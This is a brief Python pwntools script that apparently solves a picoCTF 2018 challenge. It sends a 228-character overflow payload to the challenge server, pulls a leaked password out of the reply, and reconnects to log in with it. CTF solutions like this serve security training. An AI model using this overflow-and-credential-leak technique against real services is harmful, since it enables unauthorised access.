from pwn import *

payload = 'a'*228

#r = process('./auth')
r = remote('2018shell3.picoctf.com', 1271)
r.recvuntil('\n')
r.sendline(payload)
r.sendline('fake password')
info = r.recvall()

i = info.find('.', 0, len(info)) + 1
password = info[i:].split('\n')[0]

r.close()

r = remote('2018shell3.picoctf.com', 1271)
r.recvuntil('\n')
r.sendline('name')
r.recvuntil('Password.\n')
r.sendline(password)

print r.recv()
